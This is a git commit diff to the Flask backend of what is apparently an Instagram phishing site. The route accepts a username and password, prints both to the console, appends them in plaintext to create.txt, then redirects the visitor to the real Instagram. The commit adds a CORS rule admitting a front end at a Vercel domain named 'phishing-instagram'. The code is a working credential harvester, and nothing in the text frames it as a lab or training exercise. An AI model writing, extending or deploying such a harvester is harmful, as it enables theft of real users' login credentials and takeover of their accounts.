a11257fd4a6f83515553cbef547a833910b9df72
Rakshit-Jadon <rakshitjadon.2006@gmail.com>
2025-09-28 17:29:23 +0530

    Update app.py

--- backend/app.py
+++ backend/app.py
@@ -1,7 +1,11 @@
 from flask import Flask, render_template, request, redirect
 from datetime import datetime
+from flask_cors import CORS
+
 
 app = Flask(__name__)
+
+CORS(app, resources={r"/*": {"origins": ["https://phishing-instagram-liard.vercel.app/"]}})
 
 @app.route("/", methods=['GET', 'POST'])
 def hello_world():
@@ -11,15 +15,17 @@ def hello_world():
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         print(f"login attempt - Username: {username}\nPassword: {password}")
         
-        # Save credentials to create.txt
+    
         with open('create.txt', 'a') as f:
             f.write(f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n")
             
         print(f"Login attempt saved - Username: {username}")
         print(f"Login attempt saved - password: {password}")
+    
         return redirect("https://www.instagram.com")
     return render_template("index.html")
 
 if __name__ == "__main__":
-
     app.run(debug=True, port=1111)
+
+
